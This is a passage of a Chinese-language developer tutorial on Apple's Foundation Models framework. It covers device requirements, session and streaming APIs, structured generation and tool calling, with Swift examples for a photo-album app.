    多语言支持  
      10种语言  
      自动检测  
      代码切换  
</code></pre>
<h3 data-id="heading-8">1.3 系统要求与兼容性</h3>
<h4 data-id="heading-9">设备要求详解</h4>
<p><strong>⚠️ 重要澄清</strong>：关于设备要求的常见混淆</p>
<ul>
<li><strong>正确理解</strong>：需要 <strong>A17 Pro 芯片及以上</strong></li>
<li><strong>对应设备</strong>：iPhone 15 Pro 及以上（因为 iPhone 15 Pro 搭载 A17 Pro 芯片）</li>
<li><strong>常见误解</strong>：有人误以为需要 "iPhone 17 Pro"，但实际上：<br/>
- iPhone 15 Pro 使用的是 <strong>A17 Pro</strong> 芯片<br/>
- iPhone 17 Pro 目前还不存在（截至 2024 年，最新是 iPhone 16 系列）<br/>
- 要求是 <strong>A17 Pro 芯片</strong>，不是 iPhone 17 Pro</li>
</ul>
<p><strong>完整设备要求列表</strong>：</p>






























<table><thead><tr><th>设备类型</th><th>具体要求</th><th>示例设备</th></tr></thead><tbody><tr><td><strong>iPhone</strong></td><td>A17 Pro 芯片及以上</td><td>iPhone 15 Pro、iPhone 15 Pro Max、iPhone 16 系列</td></tr><tr><td><strong>iPad</strong></td><td>A17 Pro 芯片或 M1 芯片及以上</td><td>iPad Pro (M1/M2/M3)、iPad Air (M1/M2)</td></tr><tr><td><strong>Mac</strong></td><td>Apple Silicon (M 系列)</td><td>MacBook Air/Pro (M1/M2/M3)、iMac (M1/M2/M3)</td></tr><tr><td><strong>Apple Vision Pro</strong></td><td>支持</td><td>Apple Vision Pro</td></tr></tbody></table>
<p><strong>系统要求</strong>：</p>
<ul>
<li><strong>操作系统</strong>: iOS 18.0+ / macOS 15.0+ / iPadOS 18.0+</li>
<li><strong>开发工具</strong>: Xcode 16.0+</li>
<li><strong>功能要求</strong>: Apple Intelligence 已启用（在系统设置中）</li>
</ul>
<h4 data-id="heading-10">系统要求检查流程</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Start([应用启动]) --&gt; CheckOS{检查系统版本&lt;br/&gt;iOS 18+/macOS 15+?}  
    CheckOS --&gt;|否| Error1[系统版本过低&lt;br/&gt;提示升级]  
    CheckOS --&gt;|是| CheckDevice{检查设备&lt;br/&gt;A17 Pro+/M系列?}  
    CheckDevice --&gt;|否| Error2[设备不支持&lt;br/&gt;Apple Intelligence]  
    CheckDevice --&gt;|是| CheckSetting{检查设置&lt;br/&gt;Apple Intelligence已启用?}  
    CheckSetting --&gt;|否| Error3[功能未启用&lt;br/&gt;引导用户开启]  
    CheckSetting --&gt;|是| CheckModel{检查模型可用性&lt;br/&gt;SystemLanguageModel.default}  
    CheckModel --&gt;|可用| Success[可以使用&lt;br/&gt;Foundation Models]  
    CheckModel --&gt;|不可用| Error4[模型不可用&lt;br/&gt;显示原因]  
      
    Error1 --&gt; End([结束])  
    Error2 --&gt; End  
    Error3 --&gt; End  
    Error4 --&gt; End  
    Success --&gt; Prewarm[预热模型&lt;br/&gt;可选但推荐]  
    Prewarm --&gt; End  
      
    style Start fill:#007AFF,color:#fff  
    style CheckOS fill:#5AC8FA,color:#000  
    style CheckDevice fill:#5AC8FA,color:#000  
    style CheckSetting fill:#5AC8FA,color:#000  
    style CheckModel fill:#5AC8FA,color:#000  
    style Success fill:#34C759,color:#fff  
    style Error1 fill:#FF3B30,color:#fff  
    style Error2 fill:#FF3B30,color:#fff  
    style Error3 fill:#FF3B30,color:#fff  
    style Error4 fill:#FF3B30,color:#fff  
    style Prewarm fill:#FF9500,color:#fff  
</code></pre>
<p><strong>兼容性检查代码</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> FoundationModels

<span class="hljs-comment">// 检查模型可用性  </span>
<span class="hljs-keyword">let</span> model <span class="hljs-operator">=</span> <span class="hljs-type">SystemLanguageModel</span>.default  
<span class="hljs-keyword">switch</span> model.availability {  
<span class="hljs-keyword">case</span> .available:  
    <span class="hljs-comment">// 可以使用Foundation Models  </span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ Foundation Models可用"</span>)  
<span class="hljs-keyword">case</span> .unavailable(<span class="hljs-keyword">let</span> reason):  
    <span class="hljs-comment">// 处理不可用情况  </span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ 模型不可用: <span class="hljs-subst">\(reason.localizedDescription)</span>"</span>)  
}  
</code></pre>
<h4 data-id="heading-11">开发注意事项</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR  
    subgraph "开发限制"  
        L1[模拟器限制&lt;br/&gt;必须真机测试]  
        L2[地区限制&lt;br/&gt;部分功能不可用]  
        L3[用户设置&lt;br/&gt;需启用AI功能]  
    end  
      
    subgraph "解决方案"  
        S1[使用真机测试&lt;br/&gt;iPhone 15 Pro及以上]  
        S2[提供降级方案&lt;br/&gt;功能不可用时]  
        S3[引导用户设置&lt;br/&gt;提示开启步骤]  
    end  
      
    L1 --&gt; S1  
    L2 --&gt; S2  
    L3 --&gt; S3  
      
    style L1 fill:#FF3B30,color:#fff  
    style L2 fill:#FF3B30,color:#fff  
    style L3 fill:#FF3B30,color:#fff  
    style S1 fill:#34C759,color:#fff  
    style S2 fill:#34C759,color:#fff  
    style S3 fill:#34C759,color:#fff  
</code></pre>
<h3 data-id="heading-12">1.4 应用场景概览</h3>
<h4 data-id="heading-13">在相册业务中的应用场景</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD  
    subgraph "智能照片分析"  
        A1[自动生成描述]  
        A2[识别内容]  
        A3[质量评分]  
    end  
      
    subgraph "自然语言搜索"  
        B1[时间搜索&lt;br/&gt;去年夏天]  
        B2[地点搜索&lt;br/&gt;在海边]  
        B3[人物搜索&lt;br/&gt;包含女朋友]  
    end  
      
    subgraph "智能分类"  
        C1[时间分类]  
        C2[地点分类]  
        C3[主题分类]  
        C4[人物分类]  
    end  
      
    subgraph "视频理解"  
        D1[视频摘要]  
        D2[关键时刻]  
        D3[封面生成]  
    end  
      
    subgraph "智能推荐"  
        E1[相似照片]  
        E2[相关回忆]  
        E3[个性化推荐]  
    end  
      
    subgraph "相册管理"  
        F1[清理建议]  
        F2[存储优化]  
        F3[相册整理]  
    end  
      
    style A1 fill:#007AFF,color:#fff  
    style A2 fill:#007AFF,color:#fff  
    style A3 fill:#007AFF,color:#fff  
    style B1 fill:#34C759,color:#fff  
    style B2 fill:#34C759,color:#fff  
    style B3 fill:#34C759,color:#fff  
    style C1 fill:#FF9500,color:#fff  
    style C2 fill:#FF9500,color:#fff  
    style C3 fill:#FF9500,color:#fff  
    style C4 fill:#FF9500,color:#fff  
    style D1 fill:#5AC8FA,color:#000  
    style D2 fill:#5AC8FA,color:#000  
    style D3 fill:#5AC8FA,color:#000  
    style E1 fill:#AF52DE,color:#fff  
    style E2 fill:#AF52DE,color:#fff  
    style E3 fill:#AF52DE,color:#fff  
    style F1 fill:#FF2D55,color:#fff  
    style F2 fill:#FF2D55,color:#fff  
    style F3 fill:#FF2D55,color:#fff  
</code></pre>
<h3 data-id="heading-14">1.5 与其他AI框架的对比</h3>
<h4 data-id="heading-15">Foundation Models vs Core ML vs OpenAI API</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB  
    subgraph "Core ML"  
        CM1[通用ML框架]  
        CM2[需要训练模型]  
        CM3[底层API]  
        CM4[各种ML任务]  
    end  
      
    subgraph "Foundation Models"  
        FM1[专用语言模型]  
        FM2[Apple预训练]  
        FM3[高级API]  
        FM4[NLP任务]  
    end  
      
    subgraph "OpenAI API"  
        OA1[云端服务]  
        OA2[需要网络]  
        OA3[需要密钥]  
        OA4[付费使用]  
    end  
      
    style CM1 fill:#FF9500,color:#fff  
    style CM2 fill:#FF9500,color:#fff  
    style CM3 fill:#FF9500,color:#fff  
    style CM4 fill:#FF9500,color:#fff  
      
    style FM1 fill:#34C759,color:#fff  
    style FM2 fill:#34C759,color:#fff  
    style FM3 fill:#34C759,color:#fff  
    style FM4 fill:#34C759,color:#fff  
      
    style OA1 fill:#FF3B30,color:#fff  
    style OA2 fill:#FF3B30,color:#fff  
    style OA3 fill:#FF3B30,color:#fff  
    style OA4 fill:#FF3B30,color:#fff  
</code></pre>
<p><strong>对比表格</strong>:</p>





















































<table><thead><tr><th>特性</th><th>Core ML</th><th>Foundation Models</th><th>OpenAI API</th></tr></thead><tbody><tr><td>定位</td><td>通用ML框架</td><td>专用语言模型</td><td>云端AI服务</td></tr><tr><td>模型来源</td><td>需要自己训练/转换</td><td>Apple预训练</td><td>OpenAI提供</td></tr><tr><td>API级别</td><td>底层</td><td>高级</td><td>高级</td></tr><tr><td>适用任务</td><td>各种ML任务</td><td>NLP任务</td><td>NLP任务</td></tr><tr><td>部署方式</td><td>设备端</td><td>设备端</td><td>云端</td></tr><tr><td>网络需求</td><td>无需</td><td>无需</td><td>需要</td></tr><tr><td>成本</td><td>免费</td><td>免费</td><td>付费</td></tr></tbody></table>
<h3 data-id="heading-16">1.6 设计哲学与最佳实践</h3>
<h4 data-id="heading-17">Apple的设计哲学</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR  
    subgraph "设计理念"  
        P1[隐私优先&lt;br/&gt;设备端处理]  
        P2[开发者友好&lt;br/&gt;简洁API]  
        P3[系统集成&lt;br/&gt;深度集成]  
        P4[性能优化&lt;br/&gt;Neural Engine]  
    end  
      
    subgraph "最佳实践"  
        B1[检查可用性]  
        B2[错误处理]  
        B3[降级方案]  
        B4[上下文管理]  
        B5[流式响应]  
    end  
      
    P1 --&gt; B1  
    P2 --&gt; B2  
    P3 --&gt; B3  
    P4 --&gt; B4  
    P4 --&gt; B5  
      
    style P1 fill:#007AFF,color:#fff  
    style P2 fill:#34C759,color:#fff  
    style P3 fill:#FF9500,color:#fff  
    style P4 fill:#5AC8FA,color:#000  
    style B1 fill:#AF52DE,color:#fff  
    style B2 fill:#AF52DE,color:#fff  
    style B3 fill:#AF52DE,color:#fff  
    style B4 fill:#AF52DE,color:#fff  
    style B5 fill:#AF52DE,color:#fff  
</code></pre>
<hr/>
<h2 data-id="heading-18">🔧 第二部分：核心API快速上手 </h2>
<h3 data-id="heading-19">2.1 LanguageModelSession - 会话管理</h3>
<h4 data-id="heading-20">基础使用流程</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram  
    participant App as 应用程序  
    participant Session as LanguageModelSession  
    participant Model as SystemLanguageModel  
      
    App-&gt;&gt;Session: 创建会话  
    Session-&gt;&gt;Model: 检查可用性  
    Model--&gt;&gt;Session: 返回可用状态  
      
    App-&gt;&gt;Session: sendMessage("生成标题")  
    Session-&gt;&gt;Model: 发送请求  
    Model--&gt;&gt;Session: 返回响应  
    Session--&gt;&gt;App: 返回content  
      
    Note over App,Model: 会话自动维护上下文  
</code></pre>
<p><strong>代码示例</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> FoundationModels

<span class="hljs-comment">// 创建会话  </span>
<span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()

<span class="hljs-comment">// 单轮对话  </span>
<span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
    to: <span class="hljs-string">"生成一个旅行博客的标题"</span>  
)  
<span class="hljs-built_in">print</span>(response.content)

<span class="hljs-comment">// 多轮对话 - 会话自动维护上下文  </span>
<span class="hljs-keyword">let</span> response1 <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: <span class="hljs-string">"我喜欢摄影"</span>)  
<span class="hljs-keyword">let</span> response2 <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: <span class="hljs-string">"推荐一些拍摄技巧"</span>)  
<span class="hljs-comment">// AI会记住之前说喜欢摄影  </span>
</code></pre>
<h4 data-id="heading-21">自定义指令（Instructions）</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(  
    instructions: <span class="hljs-type">Instructions</span>(<span class="hljs-string">"""  
        你是一个专业的摄影助手，擅长：  
        1. 分析照片和提供拍摄建议  
        2. 识别照片内容和场景  
        3. 提供构图和光线建议  
    """</span>)  
)  
</code></pre>
<h3 data-id="heading-22">2.2 流式响应</h3>
<h4 data-id="heading-23">流式响应工作流程</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram  
    participant UI as UI界面  
    participant Session as LanguageModelSession  
    participant Model as 语言模型  
      
    UI-&gt;&gt;Session: streamResponse("分析照片")  
    Session-&gt;&gt;Model: 开始生成  
    loop 流式生成  
        Model--&gt;&gt;Session: 生成部分文本  
        Session--&gt;&gt;UI: 返回partialText  
        UI-&gt;&gt;UI: 实时更新UI  
    end  
    Model--&gt;&gt;Session: 生成完成  
    Session--&gt;&gt;UI: 流结束  
</code></pre>
<p><strong>代码示例</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> stream <span class="hljs-operator">=</span> session.streamResponse(to: <span class="hljs-string">"分析照片"</span>)

<span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> partialText <span class="hljs-keyword">in</span> stream {  
    updateUI(with: partialText) <span class="hljs-comment">// 实时更新UI  </span>
}  
</code></pre>
<p><strong>应用场景</strong>: 聊天界面、长文本生成</p>
<h3 data-id="heading-24">2.3 结构化数据生成（@Generable）</h3>
<h4 data-id="heading-25">结构化生成流程</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR  
    A[定义数据模型&lt;br/&gt;@Generable] --&gt; B[生成Prompt&lt;br/&gt;包含字段描述]  
    B --&gt; C[AI理解需求&lt;br/&gt;基于@Guide]  
    C --&gt; D[生成结构化数据&lt;br/&gt;类型安全]  
    D --&gt; E[自动解析&lt;br/&gt;返回结果]  
      
    style A fill:#007AFF,color:#fff  
    style B fill:#5AC8FA,color:#000  
    style C fill:#FF9500,color:#fff  
    style D fill:#34C759,color:#fff  
    style E fill:#AF52DE,color:#fff  
</code></pre>
<p><strong>定义数据模型</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">PhotoAnalysis</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"照片的主题或主要内容"</span>)  
    <span class="hljs-keyword">let</span> subject: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"照片的情感色彩：positive, neutral, negative"</span>)  
    <span class="hljs-keyword">let</span> mood: <span class="hljs-type">PhotoMood</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"照片的拍摄场景：indoor, outdoor, portrait, landscape等"</span>)  
    <span class="hljs-keyword">let</span> scene: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"照片质量评分，1-10分"</span>)  
    <span class="hljs-keyword">let</span> qualityScore: <span class="hljs-type">Int</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"照片的关键词标签"</span>)  
    <span class="hljs-keyword">let</span> tags: [<span class="hljs-type">String</span>]  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"改进建议"</span>)  
    <span class="hljs-keyword">let</span> suggestions: [<span class="hljs-type">String</span>]  
}

<span class="hljs-keyword">enum</span> <span class="hljs-title class_">PhotoMood</span>: <span class="hljs-title class_">String</span>, <span class="hljs-title class_">Codable</span> {  
    <span class="hljs-keyword">case</span> positive, neutral, negative  
}  
</code></pre>
<p><strong>使用结构化生成</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
<span class="hljs-keyword">let</span> analysis <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
    to: <span class="hljs-string">"分析这张照片：<span class="hljs-subst">\(photoDescription)</span>"</span>,  
    generating: <span class="hljs-type">PhotoAnalysis</span>.<span class="hljs-keyword">self</span>  
)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"主题: <span class="hljs-subst">\(analysis.content.subject)</span>"</span>)  
<span class="hljs-built_in">print</span>(<span class="hljs-string">"质量评分: <span class="hljs-subst">\(analysis.content.qualityScore)</span>"</span>)  
<span class="hljs-built_in">print</span>(<span class="hljs-string">"标签: <span class="hljs-subst">\(analysis.content.tags.joined(separator: <span class="hljs-string">", "</span>))</span>"</span>)  
</code></pre>
<p><strong>优势</strong>:</p>
<ul>
<li>✅ 类型安全</li>
<li>✅ 自动解析</li>
<li>✅ 易于集成到现有代码</li>
</ul>
<p><strong>⚠️ Schema 开销注意</strong>: 使用 <code>@Generable</code> 时，每个属性约增加 30 tokens 的开销。在设计复杂的数据结构时，需要考虑这个开销对上下文窗口的影响。</p>
<h3 data-id="heading-26">2.4 工具调用（Tool Calling）- 核心概念</h3>
<h4 data-id="heading-27">Tool协议结构</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">classDiagram  
    class Tool {  
        &lt;&lt;protocol&gt;&gt;  
        +String name  
        +String description  
        +GenerationSchema parameters  
        +call(Arguments) Output  
    }  
      
    class PhotoSearchTool {  
        +String name  
        +String description  
        +call(Arguments) Output  
    }  
      
    class PhotoAnalysisTool {  
        +String name  
        +String description  
        +call(Arguments) Output  
    }  
      
    Tool &lt;|.. PhotoSearchTool  
    Tool &lt;|.. PhotoAnalysisTool  
      
    note for Tool "关键特性:\n- name: 工具标识符\n- description: AI判断何时使用\n- parameters: 定义参数结构\n- call: 工具执行方法"  
</code></pre>
<p><strong>Tool协议定义</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">protocol</span> <span class="hljs-title class_">Tool</span>&lt;<span class="hljs-title class_">Arguments</span>, <span class="hljs-title class_">Output</span>&gt; : <span class="hljs-title class_">Sendable</span> {  
    <span class="hljs-keyword">var</span> name: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> }  
    <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> { <span class="hljs-keyword">get</span> }  
    <span class="hljs-keyword">var</span> parameters: <span class="hljs-type">GenerationSchema</span> { <span class="hljs-keyword">get</span> }  
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">arguments</span>: <span class="hljs-type">Arguments</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">Output</span>  
}  
</code></pre>
<h4 data-id="heading-28">基础Tool实现示例</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">PhotoSearchTool</span>: <span class="hljs-title class_">Tool</span> {  
    <span class="hljs-keyword">let</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"searchPhotos"</span>  
    <span class="hljs-keyword">let</span> description <span class="hljs-operator">=</span> <span class="hljs-string">"根据关键词搜索相册中的照片"</span>  
      
    <span class="hljs-meta">@Generable</span>  
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Arguments</span> {  
        <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"搜索关键词"</span>)  
        <span class="hljs-keyword">var</span> keyword: <span class="hljs-type">String</span>  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">arguments</span>: <span class="hljs-type">Arguments</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-keyword">some</span> <span class="hljs-type">PromptRepresentable</span> {  
        <span class="hljs-keyword">let</span> photos <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> searchPhotos(keyword: arguments.keyword)  
        <span class="hljs-keyword">return</span> <span class="hljs-type">GeneratedContent</span>(properties: [  
            <span class="hljs-string">"count"</span>: photos.count,  
            <span class="hljs-string">"photos"</span>: photos.map { <span class="hljs-variable">$0</span>.toDict() }  
        ])  
    }  
}  
</code></pre>
<h4 data-id="heading-29">工具调用工作机制</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Start([用户输入:&lt;br/&gt;找一下去年夏天在海边的照片]) --&gt; Step1[1. AI理解用户意图&lt;br/&gt;分析查询内容]  
    Step1 --&gt; Step2[2. 匹配工具描述&lt;br/&gt;PhotoSearchTool description]  
    Step2 --&gt; Step3[3. 生成参数&lt;br/&gt;keyword: 海边&lt;br/&gt;timeRange: 去年夏天]  
    Step3 --&gt; Step4[4. 执行工具&lt;br/&gt;PhotoSearchTool.call]  
    Step4 --&gt; Step5[5. 获取结果&lt;br/&gt;返回照片列表]  
    Step5 --&gt; Step6[6. 生成最终响应&lt;br/&gt;我找到了5张照片...]  
    Step6 --&gt; End([返回给用户])  
      
    style Start fill:#007AFF,color:#fff  
    style Step1 fill:#5AC8FA,color:#000  
    style Step2 fill:#5AC8FA,color:#000  
    style Step3 fill:#FF9500,color:#fff  
    style Step4 fill:#FF9500,color:#fff  
    style Step5 fill:#34C759,color:#fff  
    style Step6 fill:#34C759,color:#fff  
    style End fill:#007AFF,color:#fff  
</code></pre>
<p><strong>示例流程</strong>:</p>
<pre><code class="hljs language-ini" lang="ini">用户: "找一下去年夏天在海边的照片"  
→ AI识别: 搜索照片  
→ 匹配工具: PhotoSearchTool  
→ 提取参数: <span class="hljs-attr">keyword</span>=<span class="hljs-string">"海边"</span>, timeRange=<span class="hljs-string">"去年夏天"</span>  
→ 调用工具 → 返回结果  
</code></pre>
<h4 data-id="heading-30">多工具协调</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR  
    User([用户请求:&lt;br/&gt;找照片+分析+创建相册]) --&gt; AI[AI分析请求]  
      
    AI --&gt; Tool1[PhotoSearchTool&lt;br/&gt;搜索照片]  
    Tool1 --&gt; Result1[照片列表]  
    Result1 --&gt; Tool2[PhotoAnalysisTool&lt;br/&gt;分析内容]  
    Tool2 --&gt; Result2[分析结果]  
    Result2 --&gt; Tool3[AlbumCreationTool&lt;br/&gt;创建相册]  
    Tool3 --&gt; Result3[相册创建成功]  
    Result3 --&gt; Response[AI生成最终响应]  
      
    style User fill:#007AFF,color:#fff  
    style AI fill:#5AC8FA,color:#000  
    style Tool1 fill:#FF9500,color:#fff  
    style Tool2 fill:#FF9500,color:#fff  
    style Tool3 fill:#FF9500,color:#fff  
    style Response fill:#34C759,color:#fff  
</code></pre>
<p><strong>使用示例</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(  
    tools: [<span class="hljs-type">PhotoSearchTool</span>(), <span class="hljs-type">PhotoAnalysisTool</span>(), <span class="hljs-type">AlbumCreationTool</span>()],  
    instructions: <span class="hljs-type">Instructions</span>(<span class="hljs-string">"你是智能相册助手"</span>)  
)

<span class="hljs-comment">// AI自动判断何时调用工具  </span>
<span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
    to: <span class="hljs-string">"找去年夏天在海边的照片，分析内容，创建相册"</span>  
)  
</code></pre>
<h4 data-id="heading-31">Tool Calling最佳实践</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap  
  root((Tool Calling&lt;br/&gt;最佳实践))  
    清晰的工具描述  
      AI判断依据  
      描述要准确  
      包含使用场景  
    详细的参数Guide  
      帮助AI理解  
      明确参数含义  
      提供示例  
    结构化的返回结果  
      便于AI处理  
      统一的格式  
      包含必要信息  
    完善的错误处理  
      友好的错误信息  
      异常情况处理  
      降级方案  
    单一职责原则  
      一个工具一件事  
      避免功能耦合  
      易于维护  
</code></pre>
<hr/>
<h2 data-id="heading-32">📸 第三部分：相册业务应用场景 </h2>
<h3 data-id="heading-33">3.1 智能照片分析</h3>
<h4 data-id="heading-34">场景1: 自动生成照片描述</h4>
<p><strong>数据模型定义</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">PhotoDescription</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"照片的简短描述，50字以内"</span>)  
    <span class="hljs-keyword">let</span> shortDescription: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"详细描述，包含人物、场景、活动等"</span>)  
    <span class="hljs-keyword">let</span> detailedDescription: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"建议的相册分类"</span>)  
    <span class="hljs-keyword">let</span> suggestedAlbum: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"照片的情感价值：high, medium, low"</span>)  
    <span class="hljs-keyword">let</span> emotionalValue: <span class="hljs-type">String</span>  
}  
</code></pre>
<p><strong>实现流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram  
    participant User as 用户  
    participant ViewModel as PhotoAnalysisViewModel  
    participant Session as LanguageModelSession  
    participant AI as Foundation Models  
      
    User-&gt;&gt;ViewModel: 选择照片  
    ViewModel-&gt;&gt;ViewModel: 获取照片元数据  
    ViewModel-&gt;&gt;Session: 生成分析Prompt  
    Session-&gt;&gt;AI: 发送请求  
    AI-&gt;&gt;AI: 分析照片内容  
    AI--&gt;&gt;Session: 返回结构化数据  
    Session--&gt;&gt;ViewModel: PhotoDescription  
    ViewModel-&gt;&gt;ViewModel: 更新UI状态  
    ViewModel--&gt;&gt;User: 显示分析结果  
</code></pre>
<p><strong>ViewModel实现</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Observable</span>  
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PhotoAnalysisViewModel</span> {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(  
        instructions: <span class="hljs-type">Instructions</span>(  
            <span class="hljs-string">"你是一个专业的照片分析助手，擅长分析照片内容并生成有意义的描述。"</span>  
        )  
    )  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">analyzePhoto</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">PhotoDescription</span> {  
        <span class="hljs-keyword">let</span> metadata <span class="hljs-operator">=</span> photo.metadata  
          
        <span class="hljs-keyword">let</span> prompt <span class="hljs-operator">=</span> <span class="hljs-string">"""  
            分析这张照片：  
            - 拍摄时间: <span class="hljs-subst">\(metadata.date)</span>  
            - 拍摄地点: <span class="hljs-subst">\(metadata.location <span class="hljs-operator">??</span> <span class="hljs-string">"未知"</span>)</span>  
            - EXIF信息: <span class="hljs-subst">\(metadata.exifInfo)</span>  
              
            请生成详细的照片描述和分类建议。  
        """</span>  
          
        <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
            to: <span class="hljs-type">Prompt</span>(prompt),  
            generating: <span class="hljs-type">PhotoDescription</span>.<span class="hljs-keyword">self</span>  
        )  
          
        <span class="hljs-keyword">return</span> response.content  
    }  
}  
</code></pre>
<h4 data-id="heading-35">场景2: 智能相册分类</h4>
<p><strong>分类流程图</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Start([多张照片]) --&gt; Extract[提取照片信息&lt;br/&gt;时间、地点、描述等]  
    Extract --&gt; Build[构建Prompt&lt;br/&gt;包含所有照片信息]  
    Build --&gt; AI[AI分析&lt;br/&gt;识别共同特征]  
    AI --&gt; Classify{分类标准}  
    Classify --&gt; Time[时间相关性]  
    Classify --&gt; Location[地点相关性]  
    Classify --&gt; Theme[主题相关性]  
    Classify --&gt; People[人物相关性]  
    Time --&gt; Result[生成相册建议]  
    Location --&gt; Result  
    Theme --&gt; Result  
    People --&gt; Result  
    Result --&gt; End([返回AlbumSuggestion列表])  
      
    style Start fill:#007AFF,color:#fff  
    style Extract fill:#5AC8FA,color:#000  
    style Build fill:#5AC8FA,color:#000  
    style AI fill:#FF9500,color:#fff  
    style Result fill:#34C759,color:#fff  
    style End fill:#007AFF,color:#fff  
</code></pre>
<p><strong>代码实现</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">AlbumSuggestion</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"建议的相册名称"</span>)  
    <span class="hljs-keyword">let</span> albumName: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"相册描述"</span>)  
    <span class="hljs-keyword">let</span> description: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"应该包含的照片ID列表"</span>)  
    <span class="hljs-keyword">let</span> photoIds: [<span class="hljs-type">String</span>]  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"分类理由"</span>)  
    <span class="hljs-keyword">let</span> reasoning: <span class="hljs-type">String</span>  
}

<span class="hljs-keyword">func</span> <span class="hljs-title function_">suggestAlbums</span>(<span class="hljs-params">for</span> <span class="hljs-params">photos</span>: [<span class="hljs-type">Photo</span>]) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; [<span class="hljs-type">AlbumSuggestion</span>] {  
